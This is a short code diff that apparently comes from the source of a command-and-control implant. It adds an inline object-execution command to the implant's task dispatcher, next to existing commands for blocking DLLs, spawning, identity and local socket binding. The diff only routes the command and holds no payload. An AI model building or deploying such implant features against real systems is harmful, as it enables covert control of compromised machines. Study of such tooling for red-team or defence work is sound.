@@ -8,6 +8,7 @@
 #include "download.h"
 #include "filesystem.h"
 #include "identity.h"
+#include "inline_execute_object.h"
 #include "link.h"
 #include "self.h"
 #include "spawn.h"
@@ -21,6 +22,9 @@ void TaskDispatch(int cmd, char* buffer, int size)
 	{
 		case COMMAND_BLOCKDLLS:
 			BlockDlls(buffer, size);
+			break;
+		case COMMAND_INLINE_EXECUTE_OBJECT:
+			InlineExecuteObject(buffer, size);
 			break;
 		case COMMAND_LSOCKET_BIND_LOCALHOST:
 			ChannelLSocketBind(buffer, size, LOCALHOST);
